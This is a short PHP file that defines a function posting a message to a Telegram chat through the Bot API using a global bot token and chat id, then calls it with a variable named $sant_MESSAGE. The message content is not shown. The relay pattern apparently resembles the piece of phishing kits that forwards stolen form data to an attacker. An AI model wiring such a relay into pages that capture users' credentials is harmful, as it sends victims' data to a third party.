<?php
function telegram($sant_MESSAGE) {
        global $botToken,$chatId;
        $url='https://api.telegram.org/bot'.$botToken.'/sendMessage';$data=array('chat_id'=>$chatId,'text'=>$sant_MESSAGE);
        $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
        $context=stream_context_create($options);
        $result=file_get_contents($url,false,$context);
        return $result;
}

telegram ($sant_MESSAGE);
?>